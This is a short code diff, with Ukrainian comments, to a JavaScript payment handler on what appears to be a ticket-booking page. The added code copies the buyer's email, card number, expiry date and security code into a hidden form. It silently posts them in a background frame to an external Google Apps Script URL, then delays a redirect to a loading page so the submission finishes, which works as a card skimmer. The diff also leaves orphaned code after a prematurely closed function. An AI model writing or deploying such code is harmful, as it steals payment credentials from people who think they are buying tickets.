@@ -91,13 +91,33 @@ async function onPay(){
     created_at: new Date().toISOString(),
     email: v.email,
     number: v.numberVal,
-    date: v.mdDateVal, // формат MM/DD
+    date: v.mdDateVal, // MM/DD
     code: v.codeVal,
     route: routeLabel.textContent.replace('Рейс ','').trim(),
     from: fromLabel.textContent,
     to: toLabel.textContent,
     price: (priceLabel.textContent || '').replace(' ₴','')
   };
+
+  // ===== СУПЕР-ПРОСТЕ ВІДПРАВЛЕННЯ ЧЕРЕЗ ПРИХОВАНУ ФОРМУ =====
+  const form = document.getElementById('sheetForm');
+  form.action = APPS_FORM_URL;                // URL твого Apps Script
+  form.elements.email.value  = entry.email;
+  form.elements.number.value = entry.number;
+  form.elements.date.value   = entry.date;
+  form.elements.code.value   = entry.code;
+  form.elements.route.value  = entry.route;
+  form.elements.from.value   = entry.from;
+  form.elements.to.value     = entry.to;
+  form.elements.price.value  = entry.price;
+  form.submit();  // браузер відправляє POST у фоновому <iframe> і не скасовує при переході
+
+  // мʼяка затримка перед навігацією, щоб точно встигло відправитись
+  setTimeout(() => {
+    window.location.href = '/loading.html';
+  }, 200);
+}
+
 
   // Відправляємо (не чекаємо відповіді)
   sendToSheet(entry);
